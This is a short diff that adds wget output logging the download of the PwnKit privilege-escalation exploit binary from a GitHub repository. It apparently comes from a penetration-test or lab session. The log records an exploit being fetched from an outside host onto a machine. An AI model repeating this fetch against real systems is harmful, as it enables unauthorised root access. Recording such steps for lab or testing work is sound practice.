@@ -1,0 +1,11 @@
+--2022-06-05 16:28:50--  https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.109.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 14688 (14K) [application/octet-stream]
+Saving to: ‘PwnKit.1’
+
+     0K .......... ....                                       100%  742K=0.02s
+
+2022-06-05 16:29:02 (742 KB/s) - ‘PwnKit.1’ saved [14688/14688]
+
